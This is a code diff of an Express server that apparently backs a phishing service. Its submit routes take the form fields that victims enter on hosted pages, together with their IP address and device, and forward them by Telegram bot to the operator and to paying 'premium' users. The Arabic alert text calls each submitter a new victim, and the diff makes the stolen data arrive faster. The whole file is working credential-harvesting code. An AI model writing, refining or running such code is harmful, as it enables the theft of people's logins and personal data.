@@ -1072,7 +1072,7 @@ app.post("/p/u/:uid/submit", express.json({limit:"1mb"}), async (req, res) => {
   if (!fields) return;
   const ip = clientIp || "unknown";
   const info = await enrichIP(ip).catch(()=>null);
-  const sub = { time: new Date().toJSON().slice(0,19).replace('T',' '), fields, device, platform, ip, country: info?.split("\n")[0]?.split("|")[1]?.trim()||"" };
+  const sub = { time: new Date().toJSON().slice(0,19).replace('T',' '), fields, device, platform, ip, country: info?.country || "" };
   addUserSub(uid, sub);
   const fText = Object.entries(fields).map(([k,v])=>`${k}: ${v}`).join("\n");
   bot.sendMessage(Number(uid), `✅ بيانات جديدة من صفحتك!\n\n${fText}\n\n📱 ${device||'?'} | 🌍 ${sub.country||'?'}\n⚓ ${ip}`).catch(()=>{});
@@ -1118,25 +1118,28 @@ app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
   const { fields, device, platform, ip: clientIp, pid } = req.body || {};
   const ip = getIP(req) || clientIp || "?";
   const time = new Date().toJSON().slice(0,19).replace('T',' ');
-  const sub = { time, fields: fields||{}, device:device||"?", platform:platform||"?", ip, country:"?", pid:pid||null };
+
+  // Build and send the notification IMMEDIATELY — do not wait for enrichIP
+  let txt = `🎯 ضحية جديدة ملأت الصفحة!\n━━━━━━━━━━━━━━━━━━━\n`;
+  for (const [k,v] of Object.entries(fields||{})) txt += `📝 ${k}: ${v}\n`;
+  txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n⚓ ${ip}\n⏰ ${time}`;
+  const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
+  bot.sendMessage(BOT_OWNER, txt, {reply_markup:JSON.stringify(kb)}).catch(e => console.error('[submit] sendMessage error:', e.message));
+  // Forward to premium users who have receiveOwnerSubs enabled
+  for (const [uid, pdata] of Object.entries(premium)) {
+    if (Number(uid) === BOT_OWNER) continue;
+    if (!isPremium(Number(uid))) continue;
+    if (!pdata.receiveOwnerSubs) continue;
+    bot.sendMessage(Number(uid), txt).catch(()=>{});
+  }
+
+  // Save submission record in background (enrichIP for country info)
+  const sub = { time, fields: fields||{}, device: device||"?", platform: platform||"?", ip, country:"?", pid: pid||null };
   enrichIP(ip).then(info => {
-    if (info) {
-      const m = info.match(/🌍 (.+?) \|/); if (m) sub.country = m[1];
-    }
+    if (info) sub.country = info.country || "?";
+  }).catch(()=>{}).finally(() => {
     submissions.push(sub);
     saveSubmissions();
-    let txt = `🎯 ضحية جديدة ملأت الصفحة!\n━━━━━━━━━━━━━━━━━━━\n`;
-    for (const [k,v] of Object.entries(fields||{})) txt += `📝 ${k}: ${v}\n`;
-    txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n🌍 ${sub.country} | ⚓ ${ip}\n⏰ ${time}`;
-    const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
-    bot.sendMessage(BOT_OWNER, txt, {reply_markup:JSON.stringify(kb)}).catch(()=>{});
-    // Forward to premium users who have receiveOwnerSubs enabled
-    for (const [uid, pdata] of Object.entries(premium)) {
-      if (Number(uid) === BOT_OWNER) continue;
-      if (!isPremium(Number(uid))) continue;
-      if (!pdata.receiveOwnerSubs) continue;
-      bot.sendMessage(Number(uid), txt).catch(()=>{});
-    }
   });
 });
 
